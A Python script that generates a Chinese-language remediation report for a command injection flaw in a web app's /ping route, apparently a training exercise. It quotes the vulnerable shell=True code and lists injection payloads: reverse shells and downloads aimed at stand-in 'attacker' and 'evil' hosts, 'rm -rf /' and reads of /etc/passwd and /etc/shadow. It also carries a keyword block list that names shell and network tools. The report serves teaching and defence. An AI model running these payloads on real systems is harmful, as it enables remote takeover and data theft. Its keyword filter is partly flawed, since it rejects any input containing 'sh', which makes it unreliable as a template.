#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""生成 day9 命令执行漏洞修复报告 Word 文档"""

from docx import Document
from docx.shared import Pt, Inches, Cm, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn
import datetime
import os

doc = Document()

# 设置默认字体
style = doc.styles['Normal']
font = style.font
font.name = '微软雅黑'
font.size = Pt(11)
style.element.rPr.rFonts.set(qn('w:eastAsia'), '微软雅黑')

# ============================================================
# 封面
# ============================================================
for _ in range(6):
    doc.add_paragraph('')

p = doc.add_paragraph()
p.alignment = WD_ALIGN_PARAGRAPH.CENTER
run = p.add_run('命令执行漏洞修复报告')
run.font.size = Pt(26)
run.font.bold = True
run.font.color.rgb = RGBColor(0x1A, 0x1A, 0x2E)

doc.add_paragraph()

p = doc.add_paragraph()
p.alignment = WD_ALIGN_PARAGRAPH.CENTER
run = p.add_run('Day 9 — 操作系统命令注入（OS Command Injection）')
run.font.size = Pt(14)
run.font.color.rgb = RGBColor(0x66, 0x66, 0x66)

for _ in range(6):
    doc.add_paragraph('')

info_table = doc.add_table(rows=5, cols=2)
info_table.alignment = WD_TABLE_ALIGNMENT.CENTER
info_data = [
    ('项目名称', '用户管理系统（Class01）'),
    ('报告日期', datetime.datetime.now().strftime('%Y-%m-%d')),
    ('修复人员', '王宇杨'),
    ('漏洞类型', 'OS Command Injection / 命令注入'),
    ('风险等级', '🔴 严重（Critical）'),
]
for i, (k, v) in enumerate(info_data):
    cell_k = info_table.rows[i].cells[0]
    cell_v = info_table.rows[i].cells[1]
    cell_k.text = k
    cell_v.text = v
    for cell in [cell_k, cell_v]:
        for paragraph in cell.paragraphs:
            paragraph.alignment = WD_ALIGN_PARAGRAPH.CENTER
            for run in paragraph.runs:
                run.font.size = Pt(12)

doc.add_page_break()

# ============================================================
# 目录
# ============================================================
doc.add_heading('目录', level=1)
toc_items = [
    '一、漏洞概述',
    '二、漏洞原理',
    '三、漏洞详情与修复',
    '    3.1 /ping 路由命令注入漏洞',
    '四、攻击复现',
    '五、修复方案详解',
    '六、修复验证',
    '七、安全编码规范建议',
    '八、修复变更清单',
]
for item in toc_items:
    p = doc.add_paragraph(item)
    p.paragraph_format.space_before = Pt(2)
    p.paragraph_format.space_after = Pt(2)

doc.add_page_break()

# ============================================================
# 一、漏洞概述
# ============================================================
doc.add_heading('一、漏洞概述', level=1)

doc.add_paragraph(
    '本次安全审计发现用户管理系统新增加的 /ping 网络诊断功能存在 OS 命令注入漏洞（OS Command Injection）。'
    '该漏洞是由于将用户输入的 IP 地址直接通过 f-string 拼接为系统命令字符串，并使用 shell=True 执行所造成的。'
    '攻击者可以通过在输入框中注入 shell 元字符（如 ; | & ` $ 等）来执行任意系统命令，'
    '从而获得服务器的完全控制权。'
)

doc.add_heading('漏洞总览', level=2)
vuln_table = doc.add_table(rows=2, cols=5)
vuln_table.style = 'Light Grid Accent 1'
headers = ['漏洞编号', '漏洞位置', '风险等级', '漏洞类型', '修复状态']
for i, h in enumerate(headers):
    vuln_table.rows[0].cells[i].text = h
vuln_table.rows[1].cells[0].text = 'CMD-001'
vuln_table.rows[1].cells[1].text = '/ping 路由'
vuln_table.rows[1].cells[2].text = '🔴 严重'
vuln_table.rows[1].cells[3].text = '命令注入 → RCE'
vuln_table.rows[1].cells[4].text = '✅ 已修复'

doc.add_paragraph()

doc.add_heading('CVSS 3.1 评分', level=2)
cvss_table = doc.add_table(rows=8, cols=2)
cvss_table.style = 'Light Grid Accent 1'
cvss_rows = [
    ('攻击向量（AV）', '网络（Network）— 可通过 HTTP 远程利用'),
    ('攻击复杂度（AC）', '低（Low）— 无需特殊条件'),
    ('权限要求（PR）', '低（Low）— 需要登录'),
    ('用户交互（UI）', '无（None）— 无需用户交互'),
    ('影响范围（S）', '已变化（Changed）'),
    ('机密性（C）/ 完整性（I）/ 可用性（A）', '高（High）'),
    ('最终评分', '8.8 / 10.0（高危）'),
]
for i, (k, v) in enumerate(cvss_rows):
    cvss_table.rows[i].cells[0].text = k
    cvss_table.rows[i].cells[1].text = v

doc.add_paragraph()

# ============================================================
# 二、漏洞原理
# ============================================================
doc.add_heading('二、漏洞原理', level=1)

doc.add_paragraph(
    'OS 命令注入（OS Command Injection）是指攻击者通过在输入中嵌入 shell 元字符和系统命令，'
    '使应用程序在执行系统命令时执行非预期的恶意命令的攻击方式。'
)

doc.add_heading('命令执行过程', level=2)
doc.add_paragraph(
    '在 Python 中，subprocess.check_output() 配合 shell=True 时，会将命令字符串传递给系统的 shell（/bin/sh）'
    '进行解析和执行。这意味着如果命令字符串中包含 | ; & ` $() 等特殊字符，shell 会将其解释为命令分隔符或子命令。'
)

doc.add_heading('命令注入攻击链', level=2)
attack_chain = [
    '探测注入点：输入 8.8.8.8 → 返回正常 ping 结果，确认功能可用',
    '命令分隔符测试：输入 127.0.0.1; id → 返回 id 命令执行结果，确认存在注入',
    '信息收集：输入 127.0.0.1; whoami → 获取服务器当前用户',
    '文件读取：输入 127.0.0.1; cat /etc/passwd → 读取系统文件',
    '反弹 Shell：输入 127.0.0.1; bash -i >& /dev/tcp/attacker/6666 0>&1 → 获得远程 Shell',
    '提权与横向移动：获取 root 权限后攻击内网其他主机',
]
for i, step in enumerate(attack_chain, 1):
    p = doc.add_paragraph(f'{i}. {step}')
    p.paragraph_format.space_before = Pt(2)
    p.paragraph_format.space_after = Pt(2)

doc.add_heading('漏洞根因', level=2)
doc.add_paragraph(
    '本次漏洞的根本原因有三点：'
)
causes = [
    '使用 f-string 字符串拼接命令：f"ping -c 3 {ip}" — 用户输入直接嵌入命令字符串',
    '使用 shell=True 执行命令：将命令交给 /bin/sh 解析，shell 元字符被解释执行',
    '未对用户输入做任何过滤或校验：任何字符都可以传入，包括 ; | & ` $ () 等危险字符',
]
for c in causes:
    doc.add_paragraph(c, style='List Bullet')

# ============================================================
# 三、漏洞详情与修复
# ============================================================
doc.add_page_break()
doc.add_heading('三、漏洞详情与修复', level=1)

doc.add_heading('3.1 /ping 路由命令注入漏洞（CMD-001）', level=2)

doc.add_heading('漏洞位置', level=3)
p = doc.add_paragraph()
p.add_run('文件：').bold = True
p.add_run('app.py，/ping 路由（POST），约第 1130 行')

doc.add_heading('漏洞代码（修复前）', level=3)
code_before = '''@app.route("/ping", methods=["GET", "POST"])
@login_required()
def ping():
    result = None
    ip = None
    if request.method == "POST":
        ip = request.form.get("ip", "").strip()
        if ip:
            # ❌ 漏洞：直接 f-string 拼接 + shell=True
            command = f"ping -c 3 {ip}"
            output = subprocess.check_output(
                command,
                shell=True,       # ❌ 交给 shell 解析
                timeout=30
            )
            result = output.decode("utf-8", errors="replace")
            ...
    return render_template("ping.html", result=result, ip=ip)'''

p = doc.add_paragraph()
run = p.add_run(code_before)
run.font.name = 'Consolas'
run.font.size = Pt(9)

doc.add_heading('漏洞分析', level=3)
p = doc.add_paragraph()
p.add_run('危害等级：').bold = True
p.add_run('🔴 严重（可远程执行任意代码）')
doc.add_paragraph('')
doc.add_paragraph(
    '该漏洞存在三个层面的安全问题：'
)
analysis = [
    '第一层：f-string 直接拼接 — f"ping -c 3 {ip}" 将用户输入嵌入命令字符串。输入 8.8.8.8; id 实际执行的命令为 ping -c 3 8.8.8.8; id',
    '第二层：shell=True — 命令被传递给 /bin/sh -c 执行，shell 会解析 ; 作为命令分隔符，先后执行 ping 和 id',
    '第三层：shell 元字符全开放 — | & ` $ () \\n 等全部可用，攻击者可以构造任意复杂的命令链',
]
for a in analysis:
    doc.add_paragraph(a, style='List Bullet')

doc.add_paragraph('')
p = doc.add_paragraph()
p.add_run('攻击载荷示例：').bold = True
payloads = ['8.8.8.8; id                                        → 执行 id 命令',
            '8.8.8.8; cat /etc/passwd                            → 读取系统文件',
            '8.8.8.8; wget http://attacker/shell.sh; bash shell.sh → 下载并执行恶意脚本',
            '8.8.8.8|nc attacker 4444 -e /bin/sh                 → 反弹 Shell 获取远程控制',
            '8.8.8.8&rm -rf /                                    → 破坏性操作']
for pl in payloads:
    p = doc.add_paragraph(pl)
    for run in p.runs:
        run.font.name = 'Consolas'
        run.font.size = Pt(9)
        run.font.color.rgb = RGBColor(0xCC, 0x00, 0x00)

doc.add_paragraph()

doc.add_heading('修复后代码', level=3)
code_after = '''# ✅ 新增校验函数：严格限制输入字符
def _validate_ip_or_domain(value):
    """校验输入是否为合法的 IPv4 地址或域名"""
    if not value or len(value) > 255:
        return False, "输入无效"
    # 只允许字母、数字、点、短横线
    if not re.match(r'^[a-zA-Z0-9.\\-]+$', value):
        return False, "输入包含非法字符"
    # 检查危险关键词
    dangerous = ["|", ";", "&", "`", "$", "rm ", "mkfs",
                 "bash", "sh", "python", "wget", "curl"]
    for d in dangerous:
        if d in value.lower():
            return False, f"包含禁止关键词: {d}"
    return True, None


@app.route("/ping", methods=["GET", "POST"])
@login_required()
def ping():
    result = None
    ip = None
    error = None
    if request.method == "POST":
        ip = request.form.get("ip", "").strip()
        # ✅ 修复1：先校验输入合法性
        is_valid, err_msg = _validate_ip_or_domain(ip)
        if not is_valid:
            error = err_msg
        elif ip:
            # ✅ 修复2：使用参数列表形式，不使用 shell=True
            # ✅ 修复3：不通过字符串拼接构建命令
            cmd = ["ping", "-c", "3", ip]
            output = subprocess.check_output(
                cmd,
                timeout=30,
                stderr=subprocess.STDOUT
            )
            result = output.decode("utf-8", errors="replace")
            ...
    return render_template("ping.html", result=result, ip=ip, error=error)'''

p = doc.add_paragraph()
run = p.add_run(code_after)
run.font.name = 'Consolas'
run.font.size = Pt(9)

doc.add_paragraph()

# ============================================================
# 四、攻击复现
# ============================================================
doc.add_page_break()
doc.add_heading('四、攻击复现', level=1)

doc.add_heading('4.1 基础功能测试（正常使用）', level=2)
p = doc.add_paragraph()
run = p.add_run('POST /ping  body: ip=8.8.8.8')
run.font.name = 'Consolas'
run.font.size = Pt(9)
doc.add_paragraph('修复前后均正常返回 ping 结果，显示 Google DNS 的连通性和延迟。')

doc.add_heading('4.2 命令注入 - 基本探测', level=2)
p = doc.add_paragraph()
run = p.add_run('POST /ping  body: ip=8.8.8.8;id')
run.font.name = 'Consolas'
run.font.size = Pt(9)
doc.add_paragraph('修复前：先执行 ping -c 3 8.8.8.8，然后执行 id，结果中会包含 "uid=0(root)"')
doc.add_paragraph('修复后：返回"输入包含非法字符"错误提示，拒绝执行')

doc.add_heading('4.3 命令注入 - 系统文件读取', level=2)
p = doc.add_paragraph()
run = p.add_run('POST /ping  body: ip=127.0.0.1||cat /etc/passwd')
run.font.name = 'Consolas'
run.font.size = Pt(9)
doc.add_paragraph('修复前：返回 /etc/passwd 文件内容，泄露所有系统用户信息')
doc.add_paragraph('修复后：返回"输入包含非法字符"错误提示')

doc.add_heading('4.4 命令注入 - 反弹 Shell', level=2)
p = doc.add_paragraph()
run = p.add_run('POST /ping  body: ip=0.0.0.0|nc attacker.com 4444 -e /bin/sh')
run.font.name = 'Consolas'
run.font.size = Pt(9)
doc.add_paragraph('修复前：攻击者服务器获得目标服务器的交互式 Shell，完全控制服务器')
doc.add_paragraph('修复后：返回"输入包含非法字符"错误提示')

doc.add_heading('4.5 命令注入 - 管道读取', level=2)
p = doc.add_paragraph()
run = p.add_run('POST /ping  body: ip=127.0.0.1 & cat /etc/shadow')
run.font.name = 'Consolas'
run.font.size = Pt(9)
doc.add_paragraph('修复前：& 将 ping 放入后台执行，cat 读取 /etc/shadow（如果权限允许）')
doc.add_paragraph('修复后：返回"输入包含非法字符"错误提示')

# ============================================================
# 五、修复方案详解
# ============================================================
doc.add_page_break()
doc.add_heading('五、修复方案详解', level=1)

doc.add_heading('5.1 核心修复策略', level=2)
doc.add_paragraph('本次修复采用了三层防御策略：')

doc.add_heading('第一层：字符白名单校验', level=3)
doc.add_paragraph(
    '新增 _validate_ip_or_domain() 函数，使用正则 ^[a-zA-Z0-9.\\-]+$ 仅允许字母、数字、点号和短横线。'
    '所有 shell 元字符（; | & ` $ () {} \\n \\r \\t 等）都被拒绝。'
)

doc.add_heading('第二层：危险关键词拦截', level=3)
doc.add_paragraph(
    '在输入中检测 rm、mkfs、dd、shutdown、reboot、wget、curl、bash、sh、python、'
    'perl、ruby、nc、ncat 等危险命令关键词，以及 /etc/、/passwd、/bin/、/dev/ 等'
    '系统路径关键词，匹配即拒绝。'
)

doc.add_heading('第三层：禁用 shell=True，使用参数列表', level=3)
doc.add_paragraph(
    '将命令构建方式从 f"ping -c 3 {ip}" 改为 ["ping", "-c", "3", ip] 参数列表形式，'
    '并移除 shell=True 参数。参数列表形式直接将参数传递给 ping 程序，不经过 shell 解析，'
    '从根本上杜绝了 shell 元字符注入的可能性。'
)

doc.add_heading('5.3 修复前后对比', level=2)
compare_table = doc.add_table(rows=7, cols=3)
compare_table.style = 'Light Grid Accent 1'
compare_table.rows[0].cells[0].text = '维度'
compare_table.rows[0].cells[1].text = '修复前'
compare_table.rows[0].cells[2].text = '修复后'

compare_data = [
    ('命令构建方式', 'f"ping -c 3 {ip}"（字符串拼接）', '["ping", "-c", "3", ip]（参数列表）'),
    ('shell 参数', 'shell=True', '不使用 shell=True'),
    ('输入校验', '无任何校验', '白名单正则 + 危险关键词拦截'),
    ('IP 格式校验', '无', '整数段 IP 使用 IPv4Address 严格校验'),
    ('域名校验', '无', '域名模式限制字符集'),
    ('输出处理', '失败时仅返回错误输出', '失败时返回完整错误信息 + 错误码'),
]
for r, (dim, before, after) in enumerate(compare_data):
    compare_table.rows[r + 1].cells[0].text = dim
    compare_table.rows[r + 1].cells[1].text = before
    compare_table.rows[r + 1].cells[2].text = after

doc.add_paragraph()

doc.add_heading('5.4 安全的命令执行模式', level=2)
p = doc.add_paragraph()
run = p.add_run('✅ 推荐模式（参数列表，无 shell）：')
run.bold = True
run.font.color.rgb = RGBColor(0x00, 0x88, 0x00)

good_example = '''# 每个参数作为列表元素传递
subprocess.check_output(
    ["ping", "-c", "3", user_input],  # 参数列表
    timeout=30,
    stderr=subprocess.STDOUT
)'''
p = doc.add_paragraph()
run = p.add_run(good_example)
run.font.name = 'Consolas'
run.font.size = Pt(9)
run.font.color.rgb = RGBColor(0x00, 0x88, 0x00)

doc.add_paragraph()

p = doc.add_paragraph()
run = p.add_run('❌ 危险模式（字符串拼接 + shell=True）：')
run.bold = True
run.font.color.rgb = RGBColor(0xCC, 0x00, 0x00)

bad_example = '''# 绝对禁止：f-string + shell=True
subprocess.check_output(
    f"ping -c 3 {user_input}",  # 字符串拼接
    shell=True                   # 经 shell 解析
)'''
p = doc.add_paragraph()
run = p.add_run(bad_example)
run.font.name = 'Consolas'
run.font.size = Pt(9)
run.font.color.rgb = RGBColor(0xCC, 0x00, 0x00)

doc.add_paragraph()

# ============================================================
# 六、修复验证
# ============================================================
doc.add_page_break()
doc.add_heading('六、修复验证', level=1)

doc.add_heading('6.1 功能验证', level=2)
func_table = doc.add_table(rows=6, cols=3)
func_table.style = 'Light Grid Accent 1'
func_table.rows[0].cells[0].text = '测试项'
func_table.rows[0].cells[1].text = '预期结果'
func_table.rows[0].cells[2].text = '状态'

func_data = [
    ('正常 IP：8.8.8.8', '返回 3 次 ping 结果', '✅ 通过'),
    ('正常域名：baidu.com', '返回域名 ping 结果', '✅ 通过'),
    ('回环地址：127.0.0.1', '返回本地 ping 结果', '✅ 通过'),
    ('GET 请求访问 /ping', '显示 Ping 测试页面', '✅ 通过'),
    ('未登录访问 /ping', '跳转到登录页', '✅ 通过'),
]
for r, (test, expect, status) in enumerate(func_data):
    func_table.rows[r + 1].cells[0].text = test
    func_table.rows[r + 1].cells[1].text = expect
    func_table.rows[r + 1].cells[2].text = status

doc.add_paragraph()

doc.add_heading('6.2 安全验证', level=2)
sec_table = doc.add_table(rows=9, cols=3)
sec_table.style = 'Light Grid Accent 1'
sec_table.rows[0].cells[0].text = '攻击载荷'
sec_table.rows[0].cells[1].text = '修复前'
sec_table.rows[0].cells[2].text = '修复后'

sec_data = [
    ('8.8.8.8;id', '❌ 执行 id 命令', '✅ 拒绝：非法字符'),
    ('127.0.0.1|cat /etc/passwd', '❌ 读取 /etc/passwd', '✅ 拒绝：非法字符'),
    ('0.0.0.0&rm -rf /', '❌ 危险命令执行', '✅ 拒绝：非法字符'),
    ('localhost`whoami`', '❌ 反引号执行 whoami', '✅ 拒绝：非法字符'),
    ('8.8.8.8$(cat /etc/hostname)', '❌ $() 子命令执行', '✅ 拒绝：非法字符'),
    ('8.8.8.8;wget http://evil/payload', '❌ 下载恶意文件', '✅ 拒绝：非法字符'),
    ('8.8.8.8;bash -c "id"', '❌ bash 执行命令', '✅ 拒绝：非法字符'),
    ('a.b.c.d', '❌ 传递给 ping 执行', '✅ 拒绝：无效 IP'),
]
for r, (payload, before, after) in enumerate(sec_data):
    sec_table.rows[r + 1].cells[0].text = payload
    sec_table.rows[r + 1].cells[1].text = before
    sec_table.rows[r + 1].cells[2].text = after

doc.add_paragraph()

doc.add_heading('6.3 代码检查', level=2)
check_items = [
    ('原文中无 shell=True', '✅', 'subprocess.check_output 已移除 shell=True'),
    ('原文中无 f-string 命令拼接', '✅', '使用 ["ping", "-c", "3", ip] 参数列表'),
    ('输入合法性校验', '✅', '_validate_ip_or_domain() 白名单校验'),
    ('危险关键词拦截', '✅', '黑名单关键词检测'),
    ('超时控制', '✅', 'timeout=30 秒'),
    ('Python 语法检查', '✅', 'py_compile 通过'),
]
check_table = doc.add_table(rows=len(check_items) + 1, cols=3)
check_table.style = 'Light Grid Accent 1'
check_table.rows[0].cells[0].text = '检查项'
check_table.rows[0].cells[1].text = '结果'
check_table.rows[0].cells[2].text = '说明'
for r, (item, status, note) in enumerate(check_items):
    check_table.rows[r + 1].cells[0].text = item
    check_table.rows[r + 1].cells[1].text = status
    check_table.rows[r + 1].cells[2].text = note

doc.add_paragraph()

# ============================================================
# 七、安全编码规范建议
# ============================================================
doc.add_page_break()
doc.add_heading('七、安全编码规范建议', level=1)

doc.add_heading('7.1 黄金法则：永远不要 shell=True + 字符串拼接', level=2)
doc.add_paragraph(
    'subprocess 的安全使用只有一种正确方式：参数列表 + 不指定 shell=True。'
    '当传递参数列表时，subprocess 直接使用 os.execvp() 执行程序，不经过 shell 解析，'
    '用户输入即使包含 shell 元字符也不会造成命令注入。'
)

doc.add_heading('7.2 如需使用 shell=True 的安全做法', level=2)
doc.add_paragraph(
    '如果确实需要使用 shell 特性（如管道、通配符扩展等），必须：'
)
rules_shell = [
    '不要拼接用户输入到命令字符串中',
    '使用 shlex.quote() 对用户输入进行转义',
    '尽量用 Python 代码替代 shell 功能（如 os.listdir() 替代 ls，glob 替代通配符等）',
]
for r_text in rules_shell:
    doc.add_paragraph(r_text, style='List Bullet')

doc.add_heading('7.3 Python 命令执行安全对照表', level=2)
safe_table = doc.add_table(rows=6, cols=3)
safe_table.style = 'Light Grid Accent 1'
safe_table.rows[0].cells[0].text = '函数'
safe_table.rows[0].cells[1].text = '安全用法'
safe_table.rows[0].cells[2].text = '说明'

safe_data = [
    ('subprocess.run()', 'subprocess.run(["ping", ip])', '参数列表 ✅ 安全'),
    ('subprocess.call()', 'subprocess.call(["ping", ip])', '参数列表 ✅ 安全'),
    ('subprocess.check_output()', 'subprocess.check_output(["ping", ip])', '参数列表 ✅ 安全'),
    ('os.system()', 'os.system(f"ping {ip}")', '❌ 危险：无条件 shell'),
    ('os.popen()', 'os.popen(f"ping {ip}")', '❌ 危险：无条件 shell'),
]
for r, (func, usage, note) in enumerate(safe_data):
    safe_table.rows[r + 1].cells[0].text = func
    safe_table.rows[r + 1].cells[1].text = usage
    safe_table.rows[r + 1].cells[2].text = note

doc.add_paragraph()

doc.add_heading('7.4 命令注入防御检查清单', level=2)
checklist = [
    '所有 subprocess/ os.system 调用是否使用了参数列表形式？',
    '是否设置了 shell=False（默认值）？',
    '是否对用户输入进行了输入校验（白名单优先）？',
    '是否设置了 timeout 超时防止拒绝服务？',
    '即使使用了参数列表，参数是否包含可能被程序误解的字符？',
    '是否最小化了命令执行权限？',
]
for c_text in checklist:
    doc.add_paragraph(c_text, style='List Bullet')

# ============================================================
# 八、修复变更清单
# ============================================================
doc.add_page_break()
doc.add_heading('八、修复变更清单', level=1)

change_table = doc.add_table(rows=5, cols=3)
change_table.style = 'Light Grid Accent 1'
change_table.rows[0].cells[0].text = '文件'
change_table.rows[0].cells[1].text = '变更内容'
change_table.rows[0].cells[2].text = '影响'

changes = [
    ('app.py', '新增 _validate_ip_or_domain() 输入校验函数', '白名单+黑名单双层校验'),
    ('app.py', '/ping 路由：移除 f-string 命令拼接', '改为参数列表 ["ping", "-c", "3", ip]'),
    ('app.py', '/ping 路由：移除 shell=True', '禁用 shell 解析，杜绝元字符注入'),
    ('app.py', '/ping 路由：新增错误提示 error 参数传递到模板', '用户获得清晰的错误反馈'),
]
for r, (file_path, change, impact) in enumerate(changes):
    change_table.rows[r + 1].cells[0].text = file_path
    change_table.rows[r + 1].cells[1].text = change
    change_table.rows[r + 1].cells[2].text = impact

doc.add_paragraph()

# ============================================================
# 总结
# ============================================================
doc.add_heading('总结', level=1)
doc.add_paragraph(
    '本次 /ping 命令注入漏洞的修复采取了系统性的防御策略。'
    '第一，通过 _validate_ip_or_domain() 函数对用户输入进行白名单字符校验 + 危险关键词拦截，'
    '在前端和后端双重确保输入合法性。'
    '第二，也是最关键的修复，将命令执行方式从 shell=True + 字符串拼接'
    '改为参数列表形式直接执行，从根本上消除了 shell 注入的可能。'
)
doc.add_paragraph(
    '此漏洞的典型性在于它展示了"功能性需求"与"安全性需求"的冲突。'
    '从功能角度看，f"ping -c 3 {ip}" 是最直观、最简短的实现方式；'
    '但从安全角度看，这恰恰是最危险的写法。'
    '建议将"禁止使用 shell=True + 字符串拼接"纳入项目安全编码规范中的红线条款。'
)

# ============================================================
# 保存
# ============================================================
output_dir = '/opt/Class01/项目'
output_path = os.path.join(output_dir, 'day9命令执行漏洞修复报告-王宇杨.docx')
doc.save(output_path)
print(f'✅ 报告已生成: {output_path}')
